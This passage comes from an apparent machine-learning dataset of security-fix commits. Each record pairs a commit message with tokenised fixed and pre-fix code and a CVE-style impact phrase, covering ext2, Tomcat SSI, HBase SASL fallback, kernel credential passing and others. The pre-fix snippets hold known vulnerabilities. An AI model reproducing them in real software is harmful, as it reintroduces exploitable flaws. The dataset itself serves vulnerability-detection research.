"l2i", "(", "size", ")", ";", "/", "/", "hack", "to", "check", "for", "potential", "overflow", "if", "(", "Long", ".", "MAX_VALUE", "-", "payLoadSize", "<", "startPosition", "|", "|", "Long", ".", "MAX_VALUE", "-", "payLoadSize", ">", "raf", ".", "length", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "requesting", "read", "past", "end", "of", "stream", "\"", ");", "}", "byte", "[", "]", "payload", "=", "new", "byte", "[", "payLoadSize", "]", ";", "raf", ".", "readFully", "(", "payload", ")", ";", "return", "ByteBuffer", ".", "wrap", "(", "payload", ")", ";", "}", "@", "Override", "public", "void", "close", "(", ")", "throws", "IOException", "{", "raf", ".", "close", "(", ");", "}", "}", "import", "com", ".", "coremedia", ".", "iso", ".", "IsoFile", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "Box", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "Container", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "FileTypeBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "MetaBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "MovieBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "MovieHeaderBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "SampleDescriptionBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "SampleTableBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "TrackBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "TrackHeaderBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "UserDataBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "apple", ".", "AppleItemListBox", ";", "import", "com", ".", "coremedia", ".", "iso", ".", "boxes", ".", "sampleentry", ".", "AudioSampleEntry", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "DataSource", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleAlbumBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleArtist2Box", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleArtistBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleCommentBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleCompilationBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleDiskNumberBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleEncoderBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleGPSCoordinatesBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleGenreBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleNameBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleRecordingYear2Box", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleTrackAuthorBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "AppleTrackNumberBox", ";", "import", "com", ".", "googlecode", ".", "mp4parser", ".", "boxes", ".", "apple", ".", "Utf8AppleDataBox", ";", "try", "(", "DataSource", "dataSource", "=", "new", "DirectFileReadDataSource", "(", "tstream", ".", "getFile", "(", "))", ")", "{", "try", "(", "IsoFile", "isoFile", "=", "new", "IsoFile", "(", "dataSource", ")", ")", "{", "tmp", ".", "addResource", "(", "isoFile", ")", ";", "/", "/", "Grab", "the", "file", "type", "box", "FileTypeBox", "fileType", "=", "getOrNull", "(", "isoFile", ",", "FileTypeBox", ".", "class", ")", ";", "if", "(", "fileType", "!", "=", "null", ")", "{", "/", "/", "Identify", "the", "type", "MediaType", "type", "=", "MediaType", ".", "application", "(", "\"", "mp4", "\"", ");", "for", "(", "Map", ".", "Entry", "<", "MediaType", ",", "List", "<", "String", ">", ">", "e", ":", "typesMap", ".", "entrySet", "(", "))", "{", "if", "(", "e", ".", "getValue", "(", ").", "contains", "(", "fileType", ".", "getMajorBrand", "(", "))", ")", "{", "type", "=", "e", ".", "getKey", "(", ");", "break", ";", "}", "metadata", ".", "set", "(", "Metadata", ".", "CONTENT_TYPE", ",", "type", ".", "toString", "(", "))", ";", "if", "(", "type", ".", "getType", "(", ").", "equals", "(", "\"", "audio", "\"", "))", "{", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_COMPRESSOR", ",", "fileType", ".", "getMajorBrand", "(", ").", "trim", "(", "))", ";", "}", "}", "else", "{", "/", "/", "Some", "older", "QuickTime", "files", "lack", "the", "FileType", "metadata", ".", "set", "(", "Metadata", ".", "CONTENT_TYPE", ",", "\"", "video", "/", "quicktime", "\"", ");", "/", "/", "Get", "the", "main", "MOOV", "box", "MovieBox", "moov", "=", "getOrNull", "(", "isoFile", ",", "MovieBox", ".", "class", ")", ";", "if", "(", "moov", "=", "=", "null", ")", "{", "/", "/", "Bail", "out", "return", ";", "}", "XHTMLContentHandler", "xhtml", "=", "new", "XHTMLContentHandler", "(", "handler", ",", "metadata", ")", ";", "xhtml", ".", "startDocument", "(", ");", "/", "/", "Pull", "out", "some", "information", "from", "the", "header", "box", "MovieHeaderBox", "mHeader", "=", "getOrNull", "(", "moov", ",", "MovieHeaderBox", ".", "class", ")", ";", "if", "(", "mHeader", "!", "=", "null", ")", "{", "/", "/", "Get", "the", "creation", "and", "modification", "dates", "metadata", ".", "set", "(", "Metadata", ".", "CREATION_DATE", ",", "mHeader", ".", "getCreationTime", "(", "))", ";", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "MODIFIED", ",", "mHeader", ".", "getModificationTime", "(", "))", ";", "/", "/", "Get", "the", "duration", "double", "durationSeconds", "=", "(", "(", "double", ")", "mHeader", ".", "getDuration", "(", "))", "/", "mHeader", ".", "getTimescale", "(", ");", "metadata", ".", "set", "(", "XMPDM", ".", "DURATION", ",", "DURATION_FORMAT", ".", "format", "(", "durationSeconds", ")", ");", "/", "/", "The", "timescale", "is", "normally", "the", "sampling", "rate", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_RATE", ",", "(", "int", ")", "mHeader", ".", "getTimescale", "(", "))", ";", "}", "/", "/", "Get", "some", "more", "information", "from", "the", "track", "header", "/", "/", "TODO", "Decide", "how", "to", "handle", "multiple", "tracks", "List", "<", "TrackBox", ">", "tb", "=", "moov", ".", "getBoxes", "(", "TrackBox", ".", "class", ")", ";", "if", "(", "tb", ".", "size", "(", ")", ">", "0", ")", "{", "TrackBox", "track", "=", "tb", ".", "get", "(", "0", ")", ";", "TrackHeaderBox", "header", "=", "track", ".", "getTrackHeaderBox", "(", ");", "/", "/", "Get", "the", "creation", "and", "modification", "dates", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "CREATED", ",", "header", ".", "getCreationTime", "(", "))", ";", "metadata", ".", "set", "(", "TikaCoreProperties", ".", "MODIFIED", ",", "header", ".", "getModificationTime", "(", "))", ";", "/", "/", "Get", "the", "video", "with", "and", "height", "metadata", ".", "set", "(", "Metadata", ".", "IMAGE_WIDTH", ",", "(", "int", ")", "header", ".", "getWidth", "(", "))", ";", "metadata", ".", "set", "(", "Metadata", ".", "IMAGE_LENGTH", ",", "(", "int", ")", "header", ".", "getHeight", "(", "))", ";", "/", "/", "Get", "the", "sample", "information", "SampleTableBox", "samples", "=", "track", ".", "getSampleTableBox", "(", ");", "if", "(", "samples", "!", "=", "null", ")", "{", "SampleDescriptionBox", "sampleDesc", "=", "samples", ".", "getSampleDescriptionBox", "(", ");", "if", "(", "sampleDesc", "!", "=", "null", ")", "{", "/", "/", "Look", "for", "the", "first", "Audio", "Sample", ",", "if", "present", "AudioSampleEntry", "sample", "=", "getOrNull", "(", "sampleDesc", ",", "AudioSampleEntry", ".", "class", ")", ";", "if", "(", "sample", "!", "=", "null", ")", "{", "XMPDM", ".", "ChannelTypePropertyConverter", ".", "convertAndSet", "(", "metadata", ",", "sample", ".", "getChannelCount", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_TYPE", ",", "sample", ".", "getSampleSize", "(", "))", ";", "/", "/", "TODO", "Num", "-", ">", "Type", "mapping", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_SAMPLE_RATE", ",", "(", "int", ")", "sample", ".", "getSampleRate", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_", ",", "sample", ".", "getSamplesPerPacket", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "AUDIO_", ",", "sample", ".", "getBytesPerSample", "(", "))", ";", "}", "}", "}", "}", "/", "/", "Get", "metadata", "from", "the", "User", "Data", "Box", "UserDataBox", "userData", "=", "getOrNull", "(", "moov", ",", "UserDataBox", ".", "class", ")", ";", "if", "(", "userData", "!", "=", "null", ")", "{", "extractGPS", "(", "userData", ",", "metadata", ")", ";", "MetaBox", "meta", "=", "getOrNull", "(", "userData", ",", "MetaBox", ".", "class", ")", ";", "/", "/", "Check", "for", "iTunes", "Metadata", "/", "/", "See", "http", ":", "//", "atomicparsley", ".", "sourceforge", ".", "net", "/", "mpeg", "-", "4files", ".", "html", "and", "/", "/", "http", ":", "//", "code", ".", "google", ".", "com", "/", "p", "/", "mp4v2", "/", "wiki", "/", "iTunesMetadata", "for", "more", "on", "these", "AppleItemListBox", "apple", "=", "getOrNull", "(", "meta", ",", "AppleItemListBox", ".", "class", ")", ";", "if", "(", "apple", "!", "=", "null", ")", "{", "/", "/", "Title", "AppleNameBox", "title", "=", "getOrNull", "(", "apple", ",", "AppleNameBox", ".", "class", ")", ";", "addMetadata", "(", "TikaCoreProperties", ".", "TITLE", ",", "metadata", ",", "title", ")", ";", "/", "/", "Artist", "AppleArtistBox", "artist", "=", "getOrNull", "(", "apple", ",", "AppleArtistBox", ".", "class", ")", ";", "addMetadata", "(", "TikaCoreProperties", ".", "CREATOR", ",", "metadata", ",", "artist", ")", ";", "addMetadata", "(", "XMPDM", ".", "ARTIST", ",", "metadata", ",", "artist", ")", ";", "/", "/", "Album", "Artist", "AppleArtist2Box", "artist2", "=", "getOrNull", "(", "apple", ",", "AppleArtist2Box", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "ALBUM_ARTIST", ",", "metadata", ",", "artist2", ")", ";", "/", "/", "Album", "AppleAlbumBox", "album", "=", "getOrNull", "(", "apple", ",", "AppleAlbumBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "ALBUM", ",", "metadata", ",", "album", ")", ";", "/", "/", "Composer", "AppleTrackAuthorBox", "composer", "=", "getOrNull", "(", "apple", ",", "AppleTrackAuthorBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "COMPOSER", ",", "metadata", ",", "composer", ")", ";", "/", "/", "Genre", "AppleGenreBox", "genre", "=", "getOrNull", "(", "apple", ",", "AppleGenreBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "GENRE", ",", "metadata", ",", "genre", ")", ";", "/", "/", "Year", "AppleRecordingYear2Box", "year", "=", "getOrNull", "(", "apple", ",", "AppleRecordingYear2Box", ".", "class", ")", ";", "if", "(", "year", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "RELEASE_DATE", ",", "year", ".", "getValue", "(", "))", ";", "}", "/", "/", "Track", "number", "AppleTrackNumberBox", "trackNum", "=", "getOrNull", "(", "apple", ",", "AppleTrackNumberBox", ".", "class", ")", ";", "if", "(", "trackNum", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "TRACK_NUMBER", ",", "trackNum", ".", "getA", "(", "))", ";", "/", "/", "metadata", ".", "set", "(", "XMPDM", ".", "NUMBER_OF_TRACKS", ",", "trackNum", ".", "getB", "(", "))", ";", "/", "/", "TODO", "}", "/", "/", "Disc", "number", "AppleDiskNumberBox", "discNum", "=", "getOrNull", "(", "apple", ",", "AppleDiskNumberBox", ".", "class", ")", ";", "if", "(", "discNum", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "DISC_NUMBER", ",", "discNum", ".", "getA", "(", "))", ";", "}", "/", "/", "Compilation", "AppleCompilationBox", "compilation", "=", "getOrNull", "(", "apple", ",", "AppleCompilationBox", ".", "class", ")", ";", "if", "(", "compilation", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMPDM", ".", "COMPILATION", ",", "(", "int", ")", "compilation", ".", "getValue", "(", "))", ";", "}", "/", "/", "Comment", "AppleCommentBox", "comment", "=", "getOrNull", "(", "apple", ",", "AppleCommentBox", ".", "class", ")", ";", "addMetadata", "(", "XMPDM", ".", "LOG_COMMENT", ",", "metadata", ",", "comment", ")", ";", "/", "/", "Encoder", "AppleEncoderBox", "encoder", "=", "getOrNull", "(", "apple", ",", "AppleEncoderBox", ".", "class", ")", ";", "if", "(", "encoder", "!", "=", "null", ")", "{", "metadata", ".", "set", "(", "XMP", ".", "CREATOR_TOOL", ",", "encoder", ".", "getValue", "(", "))", ";", "}", "/", "/", "As", "text", "for", "(", "Box", "box", ":", "apple", ".", "getBoxes", "(", "))", "{", "if", "(", "box", "instanceof", "Utf8AppleDataBox", ")", "{", "xhtml", ".", "element", "(", "\"", "p", "\"", ",", "(", "(", "Utf8AppleDataBox", ")", "box", ")", ".", "getValue", "(", "))", ";", "}", "}", "}", "/", "/", "TODO", "Check", "for", "other", "kinds", "too", "/", "/", "All", "done", "xhtml", ".", "endDocument", "(", ");", "}", "finally", "{", "tmp", ".", "dispose", "(", ");"], "docstring_tokens": ["a", "denial", "of", "service", "condition"]}
{"contents": ["[PATCH]", "ext2:", "skip", "pages", "past", "number", "of", "blocks", "in", "ext2_find_entry", "This", "one", "was", "pointed", "out", "on", "the", "MOKB", "site:", "http://kernelfun.blogspot.com/2006/11/mokb-09-11-2006-linux-26x-ext2checkpage.html", "If", "a", "directory's", "i_size", "is", "corrupted,", "ext2_find_entry()", "will", "keep", "processing", "pages", "until", "the", "i_size", "is", "reached,", "even", "if", "there", "are", "no", "more", "blocks", "associated", "with", "the", "directory", "inode.", "This", "patch", "puts", "in", "some", "minimal", "sanity-checking", "so", "that", "we", "don't", "keep", "checking", "pages", "(and", "issuing", "errors)", "if", "we", "know", "there", "can", "be", "no", "more", "data", "to", "read,", "based", "on", "the", "block", "count", "of", "the", "directory", "inode.", "This", "is", "somewhat", "similar", "in", "approach", "to", "the", "ext3", "patch", "I", "sent", "earlier", "this", "year.", "Signed-off-by:", "Eric", "Sandeen", "<sandeen@redhat.com>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["/", "*", "next", "page", "is", "past", "the", "blocks", "we", "'", "ve", "got", "*", "/", "if", "(", "unlikely", "(", "n", ">", "(", "dir", "-", ">", "i_blocks", ">", ">", "(", "PAGE_CACHE_SHIFT", "-", "9", ")", "))", ")", "{", "ext2_error", "(", "dir", "-", ">", "i_sb", ",", "__FUNCTION__", ",", "\"", "dir", "%", "lu", "size", "%", "lld", "exceeds", "block", "count", "%", "llu", "\"", ",", "dir", "-", ">", "i_ino", ",", "dir", "-", ">", "i_size", ",", "(", "unsigned", "long", "long", ")", "dir", "-", ">", "i_blocks", ")", ";", "goto", "out", ";", "}</s>"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(crash", ")"]}
{"contents": ["Escape", "debug", "output", "to", "aid", "readability"], "code_tokens": ["String", "variableValue", "=", "ssiMediator", ".", "getVariableValue", "(", "variableName", ",", "\"", "entity", "\"", ");", "<", "fix", ">", "Encode", "the", "output", "of", "the", "SSI", "<", "code", ">", "printenv", "<", "/", "code", ">", "command", ".", "(", "markt", ")", "<", "/", "fix", "></s>String", "variableValue", "=", "ssiMediator", ".", "getVariableValue", "(", "variableName", ")", ";"], "docstring_tokens": ["steal", "the", "victim's", "cookie-based", "authentication", "credentials"]}
{"contents": ["net:", "fix", "infoleak", "in", "llc", "The", "stack", "object", "\u201cinfo\u201d", "has", "a", "total", "size", "of", "12", "bytes.", "Its", "last", "byte", "is", "padding", "which", "is", "not", "initialized", "and", "leaked", "via", "\u201cput_cmsg\u201d.", "Signed-off-by:", "Kangjie", "Lu", "<kjlu@gatech.edu>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["memset", "(", "&", "info", ",", "0", ",", "sizeof", "(", "info", ")", ");</s>"], "docstring_tokens": ["obtain", "sensitive", "information", "from", "kernel", "stack", "memory"]}
{"contents": ["WFLY-11678:", "managed", "threads", "creation", "with", "factory's", "classloader"], "code_tokens": ["private", "static", "final", "ClassLoader", "CLASSLOADER", "=", "ElytronManagedThreadFactory", ".", "class", ".", "getClassLoader", "(", ");", "final", "ClassLoader", "tccl", "=", "WildFlySecurityManager", ".", "getCurrentContextClassLoaderPrivileged", "(", ");", "try", "{", "WildFlySecurityManager", ".", "setCurrentContextClassLoaderPrivileged", "(", "CLASSLOADER", ")", ";", "if", "(", "checking", ")", "{", "return", "AccessController", ".", "doPrivileged", "(", "(", "PrivilegedAction", "<", "ElytronManagedThread", ">", ")", "(", ")", "-", ">", "new", "ElytronManagedThread", "(", "r", ",", "contextHandleForSetup", ",", "identity", ")", ")", ";", "}", "else", "{", "return", "new", "ElytronManagedThread", "(", "r", ",", "contextHandleForSetup", ",", "identity", ")", ";", "}", "}", "finally", "{", "WildFlySecurityManager", ".", "setCurrentContextClassLoaderPrivileged", "(", "tccl", ")", ";</s>if", "(", "checking", ")", "{", "return", "AccessController", ".", "doPrivileged", "(", "(", "PrivilegedAction", "<", "ElytronManagedThread", ">", ")", "(", ")", "-", ">", "new", "ElytronManagedThread", "(", "r", ",", "contextHandleForSetup", ",", "identity", ")", ")", ";", "}", "else", "{", "return", "new", "ElytronManagedThread", "(", "r", ",", "contextHandleForSetup", ",", "identity", ")", ";"], "docstring_tokens": ["use", "the", "wrong", "security", "identity", "when", "executing", "."]}
{"contents": ["Fix", "up", "RPC", "handling", "git-svn-id:", "https://svn.apache.org/repos/asf/hbase/branches/0.94@1494871", "13f79535-47bb-0310-9956-ffa450edef68"], "code_tokens": ["public", "static", "final", "String", "IPC_CLIENT_FALLBACK_TO_SIMPLE_AUTH_ALLOWED_KEY", "=", "\"", "hbase", ".", "ipc", ".", "client", ".", "fallback", "-", "to", "-", "simple", "-", "auth", "-", "allowed", "\"", ";", "public", "static", "final", "boolean", "IPC_CLIENT_FALLBACK_TO_SIMPLE_AUTH_ALLOWED_DEFAULT", "=", "false", ";", "saslRpcClient", "=", "new", "HBaseSaslRpcClient", "(", "authMethod", ",", "token", ",", "serverPrincipal", ",", "fallbackAllowed", ")", ";", "private", "final", "boolean", "fallbackAllowed", ";", "this", ".", "fallbackAllowed", "=", "conf", ".", "getBoolean", "(", "IPC_CLIENT_FALLBACK_TO_SIMPLE_AUTH_ALLOWED_KEY", ",", "IPC_CLIENT_FALLBACK_TO_SIMPLE_AUTH_ALLOWED_DEFAULT", ")", ";", "if", "(", "LOG", ".", "isDebugEnabled", "(", "))", "{", "LOG", ".", "debug", "(", "\"", "fallbackAllowed", "=", "\"", "+", "this", ".", "fallbackAllowed", ")", ";", "}", "private", "final", "boolean", "fallbackAllowed", ";", "Token", "<", "?", "extends", "TokenIdentifier", ">", "token", ",", "String", "serverPrincipal", ",", "boolean", "fallbackAllowed", ")", "throws", "IOException", "{", "this", ".", "fallbackAllowed", "=", "fallbackAllowed", ";", "if", "(", "!", "fallbackAllowed", ")", "{", "throw", "new", "IOException", "(", "\"", "Server", "asks", "us", "to", "fall", "back", "to", "SIMPLE", "auth", ",", "\"", "+", "\"", "but", "this", "client", "is", "configured", "to", "only", "allow", "secure", "\"", "+", "\"", "connections", ".", "\")", ";", "}", "if", "(", "LOG", ".", "isDebugEnabled", "(", "))", "{", "}", "<", "property", ">", "<", "name", ">", "hbase", ".", "ipc", ".", "client", ".", "fallback", "-", "to", "-", "simple", "-", "auth", "-", "allowed", "<", "/", "name", ">", "<", "value", ">", "false", "<", "/", "value", ">", "<", "description", ">", "When", "a", "client", "is", "configured", "to", "attempt", "a", "secure", "connection", ",", "but", "attempts", "to", "connect", "to", "an", "insecure", "server", ",", "that", "server", "may", "instruct", "the", "client", "to", "switch", "to", "SASL", "SIMPLE", "(", "unsecure", ")", "authentication", ".", "This", "setting", "controls", "whether", "or", "not", "the", "client", "will", "accept", "this", "instruction", "from", "the", "server", ".", "When", "false", "(", "the", "default", ")", ",", "the", "client", "will", "not", "allow", "the", "fallback", "to", "SIMPLE", "authentication", ",", "and", "will", "abort", "the", "connection", ".", "This", "setting", "is", "only", "used", "by", "the", "secure", "RPC", "engine", ".", "<", "/", "description", ">", "<", "/", "property", ">", "<", "property", ">", "<", "name", ">", "hbase", ".", "ipc", ".", "client", ".", "fallback", "-", "to", "-", "simple", "-", "auth", "-", "allowed", "<", "/", "name", ">", "<", "value", ">", "true", "<", "/", "value", ">", "<", "/", "property", "></s>saslRpcClient", "=", "new", "HBaseSaslRpcClient", "(", "authMethod", ",", "token", ",", "serverPrincipal", ")", ";", "Token", "<", "?", "extends", "TokenIdentifier", ">", "token", ",", "String", "serverPrincipal", ")", "throws", "IOException", "{", "if", "(", "LOG", ".", "isDebugEnabled", "(", "))"], "docstring_tokens": ["disable", "bidirectional", "authentication", "and", "obtain", "sensitive", "information"]}
{"contents": ["net:", "fix", "incorrect", "credentials", "passing", "Commit", "257b5358b32f", "(\"scm:", "Capture", "the", "full", "credentials", "of", "the", "scm", "sender\")", "changed", "the", "credentials", "passing", "code", "to", "pass", "in", "the", "effective", "uid/gid", "instead", "of", "the", "real", "uid/gid.", "Obviously", "this", "doesn't", "matter", "most", "of", "the", "time", "(since", "normally", "they", "are", "the", "same),", "but", "it", "results", "in", "differences", "for", "suid", "binaries", "when", "the", "wrong", "uid/gid", "ends", "up", "being", "used.", "This", "just", "undoes", "that", "(presumably", "unintentional)", "part", "of", "the", "commit.", "Reported-by:", "Andy", "Lutomirski", "<luto@amacapital.net>", "Cc:", "Eric", "W.", "Biederman", "<ebiederm@xmission.com>", "Cc:", "Serge", "E.", "Hallyn", "<serge@hallyn.com>", "Cc:", "David", "S.", "Miller", "<davem@davemloft.net>", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>", "Acked-by:", "\"Eric", "W.", "Biederman\"", "<ebiederm@xmission.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["scm", "-", ">", "creds", ".", "uid", "=", "cred", "?", "cred", "-", ">", "uid", ":", "INVALID_UID", ";", "scm", "-", ">", "creds", ".", "gid", "=", "cred", "?", "cred", "-", ">", "gid", ":", "INVALID_GID", ";</s>scm", "-", ">", "creds", ".", "uid", "=", "cred", "?", "cred", "-", ">", "euid", ":", "INVALID_UID", ";", "scm", "-", ">", "creds", ".", "gid", "=", "cred", "?", "cred", "-", ">", "egid", ":", "INVALID_GID", ";"], "docstring_tokens": ["gain", "elevated", "privileges", "on", "the", "system"]}
{"contents": ["Implement", "nesting", "guard", "to", "avoid", "\"out", "of", "stack", "space\"", "Note", "that", "this", "limit", "is", "not", "an", "exact", "science", "it", "depends", "on", "various", "factors,", "which", "some", "are", "not", "under", "our", "control", "(compile", "time", "or", "even", "OS", "dependent", "settings", "on", "the", "available", "stack", "size)", "It", "should", "fix", "most", "common", "segfault", "cases", "though."], "code_tokens": ["#", "define", "LOCAL_COUNT", "(", "name", ",", "opt", ")", "LocalOption", "<", "size_t", ">", "cnt_", "#", "#", "name", "(", "name", ",", "opt", ")", "#", "define", "NESTING_GUARD", "(", "name", ")", "\\", "LocalOption", "<", "size_t", ">", "cnt_", "#", "#", "name", "(", "name", ",", "name", "+", "1", ")", ";", "\\", "if", "(", "nestings", ">", "MAX_NESTING", ")", "throw", "Exception", ":", ":", "NestingLimitError", "(", "pstate", ")", ";", "\\", "NestingLimitError", ":", ":", "NestingLimitError", "(", "ParserState", "pstate", ",", "std", ":", ":", "string", "msg", ",", "std", ":", ":", "vector", "<", "Sass_Import_Entry", ">", "*", "import_stack", ")", ":", "Base", "(", "pstate", ",", "msg", ",", "import_stack", ")", "{", "}", "const", "std", ":", ":", "string", "def_nesting_limit", "=", "\"", "Code", "too", "deeply", "neested", "\"", ";", "class", "NestingLimitError", ":", "public", "Base", "{", "public", ":", "NestingLimitError", "(", "ParserState", "pstate", ",", "std", ":", ":", "string", "msg", "=", "def_nesting_limit", ",", "std", ":", ":", "vector", "<", "Sass_Import_Entry", ">", "*", "import_stack", "=", "0", ")", ";", "virtual", "~", "NestingLimitError", "(", ")", "throw", "(", ")", "{", "};", "}", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "NESTING_GUARD", "(", "nestings", ")", ";", "#", "ifndef", "MAX_NESTING", "/", "/", "Note", "that", "this", "limit", "is", "not", "an", "exact", "science", "/", "/", "it", "depends", "on", "various", "factors", ",", "which", "some", "are", "/", "/", "not", "under", "our", "control", "(", "compile", "time", "or", "even", "OS", "/", "/", "dependent", "settings", "on", "the", "available", "stack", "size", ")", "/", "/", "It", "should", "fix", "most", "common", "segfault", "cases", "though", ".", "#", "define", "MAX_NESTING", "512", "#", "endif", "size_t", "indentation", ";", "size_t", "nestings", ";", "source", "(", "0", ")", ",", "position", "(", "0", ")", ",", "end", "(", "0", ")", ",", "before_token", "(", "pstate", ")", ",", "after_token", "(", "pstate", ")", ",", "pstate", "(", "pstate", ")", ",", "indentation", "(", "0", ")", ",", "nestings", "(", "0", ")</s>int", "indentation", ";", "source", "(", "0", ")", ",", "position", "(", "0", ")", ",", "end", "(", "0", ")", ",", "before_token", "(", "pstate", ")", ",", "after_token", "(", "pstate", ")", ",", "pstate", "(", "pstate", ")", ",", "indentation", "(", "0", ")"], "docstring_tokens": ["a", "denial", "of", "service", "condition"]}
{"contents": ["regset:", "Prevent", "null", "pointer", "reference", "on", "readonly", "regsets", "The", "regset", "common", "infrastructure", "assumed", "that", "regsets", "would", "always", "have", ".get", "and", ".set", "methods,", "but", "not", "necessarily", ".active", "methods.", "Unfortunately", "people", "have", "since", "written", "regsets", "without", ".set", "methods.", "Rather", "than", "putting", "in", "stub", "functions", "everywhere,", "handle", "regsets", "with", "null", ".get", "or", ".set", "methods", "explicitly.", "Signed-off-by:", "H.", "Peter", "Anvin", "<hpa@zytor.com>", "Reviewed-by:", "Oleg", "Nesterov", "<oleg@redhat.com>", "Acked-by:", "Roland", "McGrath", "<roland@hack.frob.com>", "Cc:", "<stable@vger.kernel.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "regset", "-", ">", "core_note_type", "&", "&", "regset", "-", ">", "get", "&", "&", "if", "(", "!", "regset", "-", ">", "get", ")", "return", "-", "EOPNOTSUPP", ";", "if", "(", "!", "regset", "-", ">", "set", ")", "return", "-", "EOPNOTSUPP", ";</s>if", "(", "regset", "-", ">", "core_note_type", "&", "&"], "docstring_tokens": ["the", "application", "to", "crash"]}
{"contents": ["Merge", "pull", "request", "from", "GHSA-pq4w-qm9g-qx68", "Validate", "nonce", "length", "and", "content", "on", "receipt", "and", "before", "being", "used"], "code_tokens": ["import", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "util", ".", "NonceUtil", ";", "NonceUtil", ".", "validateNonce", "(", "serverNonce", ")", ";", "byte", "[", "]", "nonceBytes", "=", "serverNonce", ".", "bytesOrEmpty", "(", ");", "import", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "util", ".", "NonceUtil", ";", "NonceUtil", ".", "validateNonce", "(", "serverNonce", ")", ";", "ByteString", "csrNonce", "=", "csr", ".", "getServerNonce", "(", ");", "NonceUtil", ".", "validateNonce", "(", "csrNonce", ")", ";", ".", "getIdentityToken", "(", "endpoint", ",", "csrNonce", ")", ";", "buildClientSignature", "(", "client", ".", "getConfig", "(", "),", "csrNonce", ")", ",", "try", "{", "ByteString", "asrNonce", "=", "asr", ".", "getServerNonce", "(", ");", "NonceUtil", ".", "validateNonce", "(", "asrNonce", ")", ";", "OpcUaSession", "session", "=", "new", "OpcUaSession", "(", "csr", ".", "getAuthenticationToken", "(", "),", "csr", ".", "getSessionId", "(", "),", "client", ".", "getConfig", "(", ").", "getSessionName", "(", ").", "get", "(", "),", "csr", ".", "getRevisedSessionTimeout", "(", "),", "csr", ".", "getMaxRequestMessageSize", "(", "),", "csr", ".", "getServerCertificate", "(", "),", "csr", ".", "getServerSoftwareCertificates", "(", ")", ")", ";", 